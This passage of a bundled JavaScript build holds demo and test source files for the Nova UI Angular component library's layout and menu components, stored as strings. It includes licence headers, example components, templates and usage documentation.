included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-layout-visual-test",\n    templateUrl: "./layout-visual-test.component.html",\n})\nexport class LayoutVisualTestComponent {}\n'},71789:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiDocsModule,\n    NuiLayoutModule,\n    NuiMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    LayoutBasicExampleComponent,\n    LayoutComplexExampleComponent,\n    LayoutExampleComponent,\n    LayoutFitContentComponent,\n    LayoutInitSizeExampleComponent,\n    LayoutPageContentExampleComponent,\n    LayoutResizeExampleComponent,\n    LayoutSeparateSheetsExampleComponent,\n    LayoutTestComponent,\n    LayoutVisualTestComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: LayoutExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "layout-test",\n        component: LayoutTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "layout-visual-test",\n        component: LayoutVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiLayoutModule,\n        NuiDocsModule,\n        NuiMessageModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        LayoutExampleComponent,\n        LayoutBasicExampleComponent,\n        LayoutSeparateSheetsExampleComponent,\n        LayoutFitContentComponent,\n        LayoutResizeExampleComponent,\n        LayoutTestComponent,\n        LayoutVisualTestComponent,\n        LayoutComplexExampleComponent,\n        LayoutInitSizeExampleComponent,\n        LayoutPageContentExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("layout"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class LayoutModule {}\n'},94928:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-menu id="nui-demo-basic-menu" title="Basic menu" i18n-title>\n    <nui-menu-action *ngFor="let item of items" (actionDone)="actionDone(item)">\n        {{ item }}\n    </nui-menu-action>\n</nui-menu>\n'},52099:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-basic-menu-example",\n    templateUrl: "./basic-menu.example.component.html",\n})\nexport class BasicMenuExampleComponent {\n    public items = ["Item 1", "Item 2", "Item 3"];\n\n    public actionDone(item: string): void {\n        console.log(`You\'ve selected ${item}`);\n    }\n}\n'},79064:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./menu-docs/menu-docs.example.component";\nexport * from "./menu-append-to-body/menu-append-to-body.example.component";\nexport * from "./basic-menu/basic-menu.example.component";\nexport * from "./menu-item-variations/menu-item-variations.example.component";\nexport * from "./menu-custom-item/menu-custom-item.example.component";\nexport * from "./menu-visual-test/menu-visual-test.component";\nexport * from "./menu-test/menu-test.component";\n'},52834:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-menu\n    id="nui-demo-append-to-body-menu"\n    title="Basic appended to body menu"\n    [appendToBody]="true"\n    i18n-title\n>\n    <nui-menu-group\n        *ngFor="let group of dataset.itemsInGroups"\n        [header]="group.header"\n    >\n        <nui-menu-action\n            *ngFor="let item of group.items"\n            (actionDone)="actionDone(item)"\n        >\n            {{ item }}\n        </nui-menu-action>\n    </nui-menu-group>\n</nui-menu>\n'},57694:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-menu-append-to-body-example",\n    templateUrl: "./menu-append-to-body.example.component.html",\n})\nexport class MenuAppendToBodyExampleComponent {\n    public dataset = {\n        itemsInGroups: [\n            {\n                header: $localize`Section 1 title`,\n                items: [\n                    $localize`Item 1`,\n                    $localize`Item 2`,\n                    $localize`Item 3`,\n                ],\n            },\n            {\n                header: $localize`Section 2 title`,\n                items: [\n                    $localize`Item 4`,\n                    $localize`Item 5`,\n                    $localize`Item 6`,\n                ],\n            },\n        ],\n    };\n    constructor() {}\n\n    public actionDone(item: string): void {\n        console.log(`Action done! Item: ` + item);\n    }\n}\n'},58542:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-menu title="Menu Custom Items" i18n-title>\n    <nui-menu-item>\n        <button nui-button type="button" (click)="doNotClosePopup($event)" i18n>\n            This one does not close popup!\n        </button>\n    </nui-menu-item>\n    <nui-menu-item (click)="switchClick($event)">\n        <div class="nui-menu-item__switch d-flex">\n            <nui-switch [value]="checked">\n                <div\n                    class="menu-custom-example__ellipsis"\n                    i18n\n                    title="This is wide ellipsified switch inside item"\n                    i18n-title\n                >\n                    This is wide ellipsified switch inside item\n                </div>\n            </nui-switch>\n        </div>\n    </nui-menu-item>\n    <nui-menu-item i18n> This one closes popup </nui-menu-item>\n</nui-menu>\n'},15966:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".menu-custom-example__ellipsis {\n    max-width: 250px;\n    overflow: hidden;\n    text-overflow: ellipsis;\n}\n"},74026:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-menu-custom-item-example",\n    templateUrl: "./menu-custom-item.example.component.html",\n    styleUrls: ["./menu-custom-item.example.component.less"],\n})\nexport class MenuCustomItemExampleComponent {\n    public checked: boolean = false;\n\n    public doNotClosePopup(event: Event): void {\n        event.stopPropagation();\n    }\n\n    public switchClick(event: Event): void {\n        this.doNotClosePopup(event);\n        this.checked = !this.checked;\n        console.log(`Switch is ${this.checked}`);\n    }\n}\n'},57634:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiMenuModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n\n<nui-message [allowDismiss]="false" type="warning">\n    Code-based menu (using <code>itemsSource</code>) is deprecated in bits v7.\n</nui-message>\n\n<p>\n    To add simple items to the <code>Menu</code> component, please use\n    <code>nui-menu-action</code> components as html children of\n    <code>nui-menu</code>.\n</p>\n<p>\n    One thing to note about the menu\'s opening behavior is that it will\n    automatically reposition itself when opened to prevent being visually\n    truncated if its default placement falls outside of the viewable area. By\n    default, the menu placement is calculated from the edge of the window.\n    However, you can optionally include a custom container with the class\n    <code>nui-edge-definer</code> surrounding the menu in your html to force the\n    menu to calculate its open position based on the edges of its container.\n</p>\n<nui-example-wrapper filenamePrefix="basic-menu" exampleTitle="Basic Menu">\n    <nui-basic-menu-example></nui-basic-menu-example>\n</nui-example-wrapper>\n\n<h2>Item Variations</h2>\n\n<p>\n    Following components can be used inside <code>menuComponent</code>:\n    <code>nui-menu-action</code>, <code>nui-menu-link</code>,\n    <code>nui-menu-option</code>, <code>nui-menu-switch</code>.\n    <code>itemTypes</code> could be mixed in one\n    <code>nui-menu</code> component.\n</p>\n<p>\n    Also button for menu could be configured with such properties:\n    <code>size</code>: compact | small | default | large,\n    <code>displayStyle</code>: "default" | "primary" | "action" | "destructive",\n    <code>icon</code> (default value is &#8243;caret-down&#8243;). For more\n    information visit Component > ButtonComponent section.\n</p>\n<p>Menu items can be grouped using <code>nui-menu-group</code> component</p>\n<nui-example-wrapper\n    filenamePrefix="menu-item-variations"\n    exampleTitle="Menu Item Variations"\n>\n    <nui-menu-item-variations-example></nui-menu-item-variations-example>\n</nui-example-wrapper>\n\n<h2>Append to Body</h2>\n<p>\n    To attach menu popup to &lt;body&gt; use <code>appendToBody</code> input. It\n    allows menu to ignore containers and overlap them.\n</p>\n<nui-example-wrapper\n    filenamePrefix="menu-append-to-body"\n    exampleTitle="Append to Body"\n>\n    <nui-menu-append-to-body-example></nui-menu-append-to-body-example>\n</nui-example-wrapper>\n\n<h2>Custom Item</h2>\n<p>\n    To create a custom menu item, put item template inside\n    <code>nui-menu-item</code> component.\n</p>\n<p>\n    Note: menu-items still have max width limited to 450 px. This is according\n    to UX mockups. For better control over switch please use\n    <code>nui-switch</code> inside <code>nui-menu-item</code> instead of\n    <code>nui-menu-switch</code>\n</p>\n<nui-example-wrapper\n    filenamePrefix="menu-custom-item"\n    exampleTitle="Custom Item"\n>\n    <nui-menu-custom-item-example></nui-menu-custom-item-example>\n</nui-example-wrapper>\n'},45534:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-menu-docs-example",\n    templateUrl: "./menu-docs.example.component.html",\n})\nexport class MenuExampleComponent {}\n'},40680:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-menu icon="menu" id="nui-demo-multi-selection-menu">\n    <nui-menu-group header="Item Types" i18n-header>\n        <nui-menu-action (actionDone)="onActionDone()" i18n\n            >Menu Action</nui-menu-action\n        >\n        <nui-menu-switch (actionDone)="onActionDone($event)" i18n\n            >Menu Switch Item</nui-menu-switch\n        >\n        <nui-menu-option (actionDone)="onActionDone($event)" i18n\n            >Menu Option</nui-menu-option\n        >\n        <nui-menu-link (actionDone)="onActionDone()" i18n\n            >Menu Link</nui-menu-link\n        >\n        <nui-menu-item (actionDone)="onActionDone()" i18n\n            >Menu Item (Default)</nui-menu-item\n        >\n    </nui-menu-group>\n    <nui-menu-group header="Destructive items" i18n-header>\n        <nui-menu-action\n            type="destructive"\n            (actionDone)="onActionDone()"\n            icon="export-pdf"\n            i18n\n            >Destructive action</nui-menu-action\n        >\n    </nui-menu-group>\n</nui-menu>\n'},64408:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-menu-item-variations-example",\n    templateUrl: "./menu-item-variations.example.component.html",\n})\nexport class MenuItemVariationsExampleComponent {\n    public onActionDone($event?: undefined | boolean): void {\n        console.log("Action Done", $event);\n    }\n}\n'},16570:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div [@.disabled]="true" style="margin: 20px">\n    <h3>Menu items variations</h3>\n    <nui-menu\n        id="nui-demo-e2e-menu-variants"\n        [itemsSource]="itemsSource"\n        title="Basic menu"\n        i18n-title\n    ></nui-menu>\n\n    <nui-menu\n        i18n-title\n        id="nui-demo-e2e-menu-append-to-body"\n        title="Menu Append to Body"\n        [appendToBody]="true"\n    >\n        <div id="nui-demo-e2e-menu-append-to-body-content">\n            <nui-menu-group header="section title" i18n-header>\n                <nui-menu-option i18n>Menu item with checkbox</nui-menu-option>\n                <nui-menu-option i18n>Second item</nui-menu-option>\n                <nui-menu-option i18n>Third menu item</nui-menu-option>\n                <nui-menu-option i18n>Fourth item</nui-menu-option>\n            </nui-menu-group>\n            <nui-menu-group header="section title" i18n-header>\n                <nui-menu-option i18n>First from second group</nui-menu-option>\n                <nui-menu-option i18n>Another menu item</nui-menu-option>\n                <nui-menu-option i18n>Menu item with checkbox</nui-menu-option>\n            </nui-menu-group>\n            <nui-menu-group>\n                <nui-menu-link i18n>Browse all properties...</nui-menu-link>\n            </nui-menu-group>\n        </div>\n    </nui-menu>\n</div>\n'},7270:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IMenuGroup } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-menu-test",\n    templateUrl: "./menu-test.component.html",\n})\nexport class MenuTestComponent {\n    public itemsSource: IMenuGroup[] = [\n        {\n            header: "section title",\n            itemsSource: [\n                {\n                    title: "Menu Item",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                { title: "Selected menu item", isSelected: true },\n                {\n                    title: "Switched checked",\n                    itemType: "switch",\n                    checked: true,\n                },\n                {\n                    title: "Switch unchecked",\n                    itemType: "switch",\n                    checked: false,\n                },\n                {\n                    title: "Disabled switch",\n                    itemType: "switch",\n                    disabled: true,\n                    checked: false,\n                },\n                {\n                    title: "Disabled action",\n                    itemType: "action",\n                    disabled: true,\n                },\n                {\n                    title: "Disabled link",\n                    itemType: "link",\n                    url: "#button",\n                    disabled: true,\n                },\n                {\n                    title: "Disabled option",\n                    itemType: "option",\n                    disabled: true,\n                    checked: false,\n                },\n                { title: "Menu item with checkbox", itemType: "option" },\n                {\n                    title: "Menu item with icon",\n                    itemType: "action",\n                    icon: "table",\n                },\n                { title: "Link menu item", itemType: "link", url: "#button" },\n                {\n                    title: "Export PDF",\n                    itemType: "link",\n                    icon: "export-pdf",\n                    url: "#button",\n                },\n            ],\n        },\n        {\n            header: "section 2 title",\n            itemsSource: [\n                {\n                    title: "Menu Item1",\n                    itemType: "option",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Menu Item2",\n                    itemType: "option",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Menu Item3",\n                    itemType: "option",\n                    action: this.actionDone,\n                },\n            ],\n        },\n    ];\n\n    public actionDone(): void {\n        console.log("Action Done");\n    }\n}\n'},57794:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<style>\n    .footer {\n        position: absolute;\n        bottom: 0;\n        width: 100%;\n        height: 60px;\n        line-height: 60px;\n        background-color: #f5f5f5;\n    }\n    .row {\n        margin-right: 0;\n        margin-left: -10px;\n    }\n</style>\n\n<div>\n    <h3>Basic menu with different display types and icons</h3>\n    <div class="row">\n        <div class="col-md-3">\n            <nui-menu\n                id="nui-demo-basic-menu-with-icon"\n                title="Basic menu"\n                [itemsSource]="itemsSource"\n            >\n            </nui-menu>\n        </div>\n        <div class="col-md-3">\n            <nui-menu\n                id="nui-demo-primary-menu-with-icon"\n                title="Primary menu"\n                displayStyle="primary"\n                [itemsSource]="itemsSource"\n                icon="add"\n            >\n            </nui-menu>\n        </div>\n        <div class="col-md-3">\n            <nui-menu\n                id="nui-demo-action-menu-with-icon"\n                title="Action menu"\n                displayStyle="action"\n                [itemsSource]="itemsSource"\n                icon="check"\n            >\n            </nui-menu>\n        </div>\n        <div class="col-md-3">\n            <div class="pull-right">\n                <nui-menu\n                    id="nui-demo-destructive-menu-with-icon"\n                    title="Dstrctv"\n                    displayStyle="destructive"\n                    [itemsSource]="itemsSource"\n                    icon="run"\n                >\n                </nui-menu>\n            </div>\n        </div>\n    </div>\n    <hr />\n\n    <h3>Menu items variations</h3>\n    <div class="row">\n        <div class="col-md-3">\n            <nui-menu\n                id="nui-demo-menu-variants_menu"\n                [itemsSource]="itemsSourceVariations"\n                icon="menu"\n            >\n            </nui-menu>\n        </div>\n        <div class="col-md-3">\n            <nui-menu\n                id="nui-demo-menu-variants_add"\n                [itemsSource]="itemsSourceVariations"\n                icon="add"\n            >\n            </nui-menu>\n        </div>\n        <div class="col-md-3">\n            <nui-menu\n                id="nui-demo-menu-variants_gear"\n                [itemsSource]="itemsSourceVariations"\n                icon="gear"\n            >\n            </nui-menu>\n        </div>\n        <div class="col-md-3">\n            <div class="pull-right">\n                <nui-menu\n                    id="nui-demo-menu-variants_run"\n                    displayStyle="destructive"\n                    [itemsSource]="itemsSourceVariations"\n                    icon="run"\n                >\n                </nui-menu>\n            </div>\n        </div>\n    </div>\n    <hr />\n\n    <h3>Menu with multiselection</h3>\n    <nui-menu title="Multi-selection" id="nui-demo-multi-selection-menu">\n        <nui-menu-group header="section title">\n            <nui-menu-option>Menu item with checkbox</nui-menu-option>\n            <nui-menu-option>Second item</nui-menu-option>\n            <nui-menu-option>Third menu item</nui-menu-option>\n            <nui-menu-option>Fourth item</nui-menu-option>\n        </nui-menu-group>\n        <nui-menu-group header="section 2 title">\n            <nui-menu-option>First from second group</nui-menu-option>\n            <nui-menu-option>Another menu item</nui-menu-option>\n            <nui-menu-option>Menu item with checkbox</nui-menu-option>\n        </nui-menu-group>\n\n        <nui-menu-group>\n            <nui-menu-link>Browse all properties...</nui-menu-link>\n            <nui-menu-action type="destructive" icon="export-pdf"\n                >Destructive action</nui-menu-action\n            >\n        </nui-menu-group>\n    </nui-menu>\n    <hr />\n\n    <div class="row footer">\n        <div class="col-md-1">\n            <nui-menu\n                id="nui-demo-basic-menu-with-icon-footer"\n                title="Basic menu"\n                [itemsSource]="itemsSource"\n            >\n            </nui-menu>\n        </div>\n        <div class="col-md-11">\n            <div class="pull-right">\n                <nui-menu\n                    id="nui-demo-destructive-menu-with-icon-footer"\n                    title="Dstrctv"\n                    displayStyle="destructive"\n                    [itemsSource]="itemsSource"\n                    icon="run"\n                >\n                </nui-menu>\n            </div>\n        </div>\n    </div>\n</div>\n'},13329:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IMenuGroup, MenuActionType } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-menu-visual-test",\n    templateUrl: "./menu-visual-test.component.html",\n})\nexport class MenuVisualTestComponent {\n    public itemsSource: IMenuGroup[] = [\n        {\n            header: "Group 1",\n            itemsSource: [\n                {\n                    title: "Item 1",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Item 2",\n                    itemType: "action",\n                    action: (): void => alert("hello"),\n                },\n                {\n                    title: "Item 3",\n                    itemType: "action",\n                    action: this.actionWithParams.bind(this, 2),\n                },\n                {\n                    title: "Item 4",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Item 5",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Item 6",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n            ],\n        },\n        {\n            itemsSource: [\n                {\n                    title: "Item 7",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Item 8",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Item 9",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Item 10",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Item 11",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Item 12",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Item 13",\n                    itemType: "action",\n                    action: this.actionDone,\n                    disabled: true,\n                },\n                {\n                    title: "Item 14",\n                    itemType: "action",\n                    action: this.actionDone,\n                    itemClass: MenuActionType.destructive,\n                },\n            ],\n        },\n    ];\n\n    public itemsSourceVariations: IMenuGroup[] = [\n        {\n            header: "section title",\n            itemsSource: [\n                {\n                    title: "Menu Item",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n                {\n                    title: "Hover me",\n                    itemType: "action",\n                    action: this.actionDone,\n                },\n         